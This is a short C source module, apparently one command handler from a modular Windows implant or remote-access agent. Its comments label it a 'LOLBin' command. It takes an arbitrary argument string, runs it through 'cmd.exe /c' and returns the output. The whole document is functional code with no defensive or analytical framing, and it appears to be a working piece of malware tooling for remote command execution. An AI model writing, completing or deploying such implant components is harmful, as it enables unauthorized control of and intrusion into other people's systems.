// chunk: commands/cmd_exec
// depends: core/run_cmd
// provides: cmd_exec
// note: LOLBin — executes args via cmd.exe /c (spawns child process)

#ifndef CHUNK_CMD_EXEC
#define CHUNK_CMD_EXEC

static int cmd_exec(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    if (args_len == 0 || !args) {
        *out_len = 0;
        return 1;
    }

    char cmd_line[2048] = {0};
    char arg_buf[1536] = {0};
    DWORD cplen = (args_len < sizeof(arg_buf) - 1) ? args_len : sizeof(arg_buf) - 1;
    memcpy(arg_buf, args, cplen);
    while (cplen > 0 && (arg_buf[cplen - 1] == '\r' || arg_buf[cplen - 1] == '\n'))
        arg_buf[--cplen] = '\0';

    snprintf(cmd_line, sizeof(cmd_line), "cmd.exe /c %s", arg_buf);
    run_cmd(cmd_line, out, *out_len, out_len);
    return 0;
}

#endif
